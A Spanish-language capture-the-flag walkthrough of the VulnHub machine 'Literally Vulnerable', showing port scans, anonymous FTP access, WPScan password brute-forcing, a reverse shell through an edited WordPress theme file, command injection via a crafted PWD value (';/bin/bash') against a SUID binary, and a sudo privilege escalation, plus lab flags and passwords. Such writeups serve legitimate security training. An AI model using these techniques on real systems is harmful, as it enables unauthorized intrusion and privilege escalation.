---
title: LiterallyVulnerable Writeup - Vulnhub
date: 2025-03-03
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, LiterallyVulnerable, OSCP Prep, Wordpress, wpscan]
image:
  path: /assets/img/commons/vulnhub/LiterallyVulnerable/portada.png
---

Anterior [*OSCP Lab 15*](https://lvs3c.github.io/posts/OSCP-Misdirection/)

¡Saludos!

**`OSCP Lab 16`**

En este writeup, realizaremos la máquina [**Literally Vulnerable**](https://www.vulnhub.com/entry/ua-literally-vulnerable,407/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **FTP** obteniendo archivo de passwords.
- **Wpscan** para analizar CMS Wordpress.
- **Reverse shell** modificando archivo de un tema en Wordpress.
- **User Pivoting** mediante permiso SUID sobre un binario, obtenemos la password del usuario.
- Y por último, acceso root al ejecutar un archivo al cual tenemos permisos pero debemos crear, listamos las 3 flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.35     00:0c:29:db:dd:a9       VMware, Inc.
10.11.12.200    00:50:56:f0:94:61       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.504 seconds (102.24 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.35
PING 10.11.12.35 (10.11.12.35) 56(84) bytes of data.
64 bytes from 10.11.12.35: icmp_seq=1 ttl=64 time=0.302 ms

--- 10.11.12.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.302/0.302/0.302/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn 10.11.12.35 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 22:36 -03
Nmap scan report for 10.11.12.35
Host is up (0.0012s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
65535/tcp open  unknown
MAC Address: 00:0C:29:DB:DD:A9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p21,22,80,65535 -sCV 10.11.12.35 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 22:37 -03
Nmap scan report for 10.11.12.35
Host is up (0.00031s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.12.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           325 Dec 04  2019 backupPasswords
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Not so Vulnerable &#8211; Just another WordPress site
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 5.3
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:DB:DD:A9 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.61 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `vsftpd 3.0.3`.
- Puerto `22` servidor `OpenSSH 7.6p1`.
- Puerto `80` servidor `nginx 1.14.0`.
- Puerto `65535` servidor `Apache httpd 2.4.29`.


### FTP - 21

Tenemos acceso al servicio ftp con el usuario anoymous. Ingresamos y descargamos el archivo `backupPasswords`.

```bash
❯ ftp 10.11.12.35
Connected to 10.11.12.35.
220 (vsFTPd 3.0.3)
Name (10.11.12.35:lvs3c): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48438|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           325 Dec 04  2019 backupPasswords
226 Directory send OK.
ftp> get backupPasswords
local: backupPasswords remote: backupPasswords
229 Entering Extended Passive Mode (|||43046|)
150 Opening BINARY mode data connection for backupPasswords (325 bytes).
100% |*************************************************************************************|   325      109.97 KiB/s    00:00 ETA
226 Transfer complete.
325 bytes received in 00:00 (90.70 KiB/s)
ftp>
```

Dentro del archivo encontramos lo siguiente.

```bash
❯ cat backupPasswords
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: backupPasswords
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Hi Doe,
   2   │
   3   │ I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't
       │ get hacked by those elites again!
   4   │
   5   │ *$eGRIf7v38s&p7
   6   │ yP$*SV09YOrx7mY
   7   │ GmceC&oOBtbnFCH
   8   │ 3!IZguT2piU8X$c
   9   │ P&s%F1D4#KDBSeS
  10   │ $EPid%J2L9LufO5
  11   │ nD!mb*aHON&76&G
  12   │ $*Ke7q2ko3tqoZo
  13   │ SCb$I^gDDqE34fA
  14   │ Ae%tM0XIWUMsCLp
```

Guardamos las claves como un diccionario y las tendremos en cuenta para más adelante. 

### HTTP - 80 - 65535

Hacemos un análisis de las webs con `whatweb` para ver sus tecnologías.

Validamos las webs.

![web80](/assets/img/commons/vulnhub/LiterallyVulnerable/web80.png){: .center-image }
![web65535](/assets/img/commons/vulnhub/LiterallyVulnerable/web65535.png){: .center-image }


Continuamos realizando un fuzzing de directorios con `gobuster`.

```bash
❯ gobuster dir -u http://10.11.12.35/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -o root80_go.log -b 301,403,404 -x txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.35/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404,301,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.35/wp-login.php         (Status: 200) [Size: 4925]
http://10.11.12.35/license.txt          (Status: 200) [Size: 19935]
http://10.11.12.35/wp-trackback.php     (Status: 200) [Size: 135]
http://10.11.12.35/xmlrpc.php           (Status: 405) [Size: 42]
http://10.11.12.35/wp-signup.php        (Status: 302) [Size: 0] [--> http://literally.vulnerable/wp-login.php?action=register]
Progress: 450221 / 3821502 (11.78%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 450226 / 3821502 (11.78%)
===============================================================
Finished
===============================================================
```

Sobre el puerto 80 encontramos un sitio en Wordpress, pero no podemos hacer mucho sobre este sitio.

Lanzamos `WPScan` encontrando el usuario `admin`{: .filepath}, pero ninguna clave obtenida por ftp sirvió.

Notamos que internamente el código busca el DNS: `literally.vulnerable`, lo añadimos a nuestro archivo `/etc/hosts`{: .filepath}

```bash
echo "10.11.12.35\tliterally.vulnerable" >> /etc/hosts
```

Continuamos explorando el puerto 65535.

```bash
❯ gobuster dir -u http://10.11.12.35:65535/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -o root65535_go.log -b 403,404 -x txt,php,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.35:65535/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,js
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.35:65535/javascript           (Status: 301) [Size: 324] [--> http://10.11.12.35:65535/javascript/]
http://10.11.12.35:65535/phpcms               (Status: 301) [Size: 320] [--> http://10.11.12.35:65535/phpcms/]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos otro sitio Wordpress, pero tuvimos que usar un diccionario más grande.

En este sitio nos encontramos con un post privado, el cual contiene una clave.

![protected](/assets/img/commons/vulnhub/LiterallyVulnerable/protected.png){: .center-image }

Lanzamos `WPScan` para obterner información del sitio y usuarios.

```bash
❯ wpscan --url http://literally.vulnerable:65535/phpcms/ -e u,vp,vt --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://literally.vulnerable:65535/phpcms/ [10.11.12.35]
[+] Started: Tue Mar  4 21:26:04 2025

[i] User(s) Identified:

[+] notadmin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://literally.vulnerable:65535/phpcms/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] maybeadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Continuamos haciendo fuerza bruta mediante WPScan, utilizando el diccionario de claves obtenidas y los usuarios.

```bash
❯ wpscan --url http://literally.vulnerable:65535/phpcms -U users.txt -P ../content/backupPasswords
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://literally.vulnerable:65535/phpcms/ [10.11.12.35]
[+] Started: Tue Mar  4 10:46:25 2025

[+] Performing password attack on Xmlrpc against 2 user/s
Trying notadmin / I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so [SUCCESS] - maybeadmin / $EPid%J2L9LufO5
Trying notadmin / Ae%tM0XIWUMsCLp Time: 00:00:01 <============================                  > (24 / 38) 63.15%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: maybeadmin, Password: $EPid%J2L9LufO5
```

Obtenemos la password de `maybeadmin`.

## Explotación

---

Ingresamos al panel de Wordpress correctamente, pero no somos administradores. 

Podemos ver el contenido del post privado, obtenemos la password del usuario `notadmin`.

![notadminpass](/assets/img/commons/vulnhub/LiterallyVulnerable/notadminpass.png){: .center-image }

Ingresamos con dicho usuario y tratamos de modificar algún archivo de configuración para generarnos la reverse shell.

Bajo el tema `Twenty Twenty` no podemos modificar los archivos porque nos muestra error.

![404themefail](/assets/img/commons/vulnhub/LiterallyVulnerable/404themefail.png){: .center-image }

Seleccionamos el tema `Twenty Nineteen` y podemos agregar nuestro código, en este caso sobre el archivo de error `404.php`.

![404themeok](/assets/img/commons/vulnhub/LiterallyVulnerable/404themeok.png){: .center-image }

Validamos y generamos la reverse shell.

![404whoami](/assets/img/commons/vulnhub/LiterallyVulnerable/404whoami.png){: .center-image }

![404rs](/assets/img/commons/vulnhub/LiterallyVulnerable/404rs.png){: .center-image }

Nos ponemos en escucha y obtenemos la conexión.

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.35] 35688
bash: cannot set terminal process group (1135): Inappropriate ioctl for device
bash: no job control in this shell
</www/html/phpcms/wp-content/themes/twentynineteen$ whoami
whoami
www-data
```

## User Pivoting

---

En este momento somos el usuario `www-data`, listando los archivos del sistema encontramos un binario SUID perteneciente al usuario `john`, el cual al ejecutarlo te devuelve un mensaje con un path.

```bash
www-data@literallyvulnerable:/home/doe$ ./itseasy
Your Path is: /home/doe
```

Teniendo disponible el comando `ltrace` podemos debuguear el programa.

```bash
www-data@literallyvulnerable:/home/doe$ ltrace ./itseasy
getegid()                                                                                                                                                        = 33
geteuid()                                                                                                                                                        = 33
setresgid(33, 33, 33, 33)                                                                                                                                        = 0
setresuid(33, 33, 33, 33)                                                                                                                                        = 0
getenv("PWD")                                                                                                                                                    = "/home/doe"
asprintf(0x7ffe7e3fdc50, 0x5651d8ed19a8, 0x7ffe7e3feecc, 68)                                                                                                     = 33
system("/bin/echo Your Path is: /home/do"...Your Path is: /home/doe
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                                           = 0
+++ exited (status 0) +++
www-data@literallyvulnerable:/home/doe$
```

Como vemos, la sentencia `getenv("PWD")` llama a la variable PWD para obtener su contenido, luego ejecuta mediante el método `system` un echo, acá podemos romper la consulta y añadir nuestro código. 

Validamos las variables.

```bash
www-data@literallyvulnerable:/home/doe$ env
APACHE_LOG_DIR=/var/log/apache2
LANG=C
OLDPWD=/var/www/nginx
INVOCATION_ID=c8d3a2ae7e3e44c6bfb7dad4bb1cd768
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/home/doe
JOURNAL_STREAM=9:25334
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
SHELL=bash
TERM=xterm
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=7
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
```

En este punto, lo que vamos a hacer es modificar la variable y obtener el usuario `john`{: .filepath}.

```bash
www-data@literallyvulnerable:$ export PWD=';/bin/bash'
www-data@literallyvulnerable:$ ./itseasy
Your Path is:
john@literallyvulnerable:/home/doe$
```

Una vez dentro del usuario, listamos la user flag. Luego, buscamos archivos en todo el sistema que sean pertenecientes a dicho usuario, encontramos un archivo con la password pero está en base64, la desencriptamos y nos conectamos por *ssh*.

```bash
john@literallyvulnerable:/home/john$ cat user.txt
Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;)
Flag: iuz1498ne667ldqmfarfrky9v5ylki

john@literallyvulnerable:/home/john$ find / -group john 2>/dev/null
/home/doe/itseasy
/home/john
/home/john/.bash_logout
/home/john/user.txt
/home/john/.gnupg
/home/john/.gnupg/private-keys-v1.d
/home/john/.bashrc
/home/john/.local
/home/john/.local/share
/home/john/.local/share/tmpFiles
/home/john/.local/share/tmpFiles/myPassword
/home/john/.local/share/nano
/home/john/.profile
/home/john/.cache
/home/john/.cache/motd.legal-displayed
john@literallyvulnerable:/home/john$

john@literallyvulnerable:/home/john/.local/share/tmpFiles$ cat myPassword
I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
am9objpZWlckczhZNDlJQiNaWko=

john@literallyvulnerable:/home/john$ echo am9objpZWlckczhZNDlJQiNaWko= | base64 -d; echo
john:YZW$s8Y49IB#ZZJ
```

## Escalación de privilegios

---

Ingresamos por SSH con el usuario `john`{: .filepath} y listamos los permisos del usuario sobre el sistema.

```bash
❯ ssh john@10.11.12.35
john@literallyvulnerable:~$ sudo -l
[sudo] password for john:
Matching Defaults entries for john on literallyvulnerable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on literallyvulnerable:
    (root) /var/www/html/test.html
```

John puede ejecutar como root el archivo `test.html` dentro de `/var/www/html`{: .filepath}. 

Dicho archivo no existe, el inconveniente es que `john`{: .filepath} no tiene permisos sobre la carpeta pero sí `www-data`{: .filepath}, con el cual ganamos la reverse shell, volvemos a esta y generamos el archivo con nuestro código.

```bash
john@literallyvulnerable:/var/www/html$ echo "/bin/bash" > test.html
-bash: test.html: Permission denied

www-data@literallyvulnerable:/var/www/html$ echo "/bin/bash" > test.html
www-data@literallyvulnerable:/var/www/html$ chmod +x test.html
```

Ahora ejecutamos el archivo y somos root, listamos las flags restantes: root.txt y local.txt.

```bash
john@literallyvulnerable:/var/www/html$ sudo /var/www/html/test.html
root@literallyvulnerable:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@literallyvulnerable:/var/www/html# cd /root/
root@literallyvulnerable:/root# ls
root.txt
root@literallyvulnerable:/root# cat root.txt
It was
 _     _ _                 _ _         _   _       _                      _     _      _
| |   (_) |               | | |       | | | |     | |                    | |   | |    | |
| |    _| |_ ___ _ __ __ _| | |_   _  | | | |_   _| |_ __   ___ _ __ __ _| |__ | | ___| |
| |   | | __/ _ \ '__/ _` | | | | | | | | | | | | | | '_ \ / _ \ '__/ _` | '_ \| |/ _ \ |
| |___| | ||  __/ | | (_| | | | |_| | \ \_/ / |_| | | | | |  __/ | | (_| | |_) | |  __/_|
\_____/_|\__\___|_|  \__,_|_|_|\__, |  \___/ \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|\___(_)
                                __/ |
                               |___/

Congrats, you did it! I hope it was *literally easy* for you! :)
Flag: pabtejcnqisp6un0sbz0mrb3akaudk

Let me know, if you liked the machine @syed__umar

root@literallyvulnerable:/home/doe# cat local.txt
Congrats, you did it! I hope it was *easy* for you! Keep in mind #EEE is the way to go!
Flag: worjnp1jxh9iefqxrj2fkgdy3kpejp
```

Hope it helps!